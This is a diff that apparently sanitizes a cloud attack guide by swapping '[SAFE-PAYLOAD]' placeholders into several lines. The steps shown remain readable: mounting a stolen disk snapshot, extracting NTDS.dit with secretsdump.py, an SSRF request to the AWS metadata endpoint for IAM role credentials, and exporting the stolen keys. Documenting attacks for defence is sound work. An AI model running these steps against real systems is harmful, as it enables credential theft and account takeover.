@@ -294,7 +294,7 @@ sudo mount /dev/xvdf1 /mnt/stolen
 # 2. Share snapshot with attacker account
 # 3. Mount in attacker instance
 # 4. Extract NTDS.dit and SYSTEM
-secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
+# [SAFE-PAYLOAD] secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local (Simulating credentials extraction)
 ```
 
 ---
@@ -372,11 +372,11 @@ aws cloudtrail update-trail --name trail_name \
 
 ```bash
 # 1. Find SSRF vulnerability in web app
-https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+https://[SAFE-PAYLOAD]/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # 2. Get role name from response
 # 3. Extract credentials
-https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
+https://[SAFE-PAYLOAD]/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
 
 # 4. Configure AWS CLI with stolen creds
 export AWS_ACCESS_KEY_ID=ASIA...
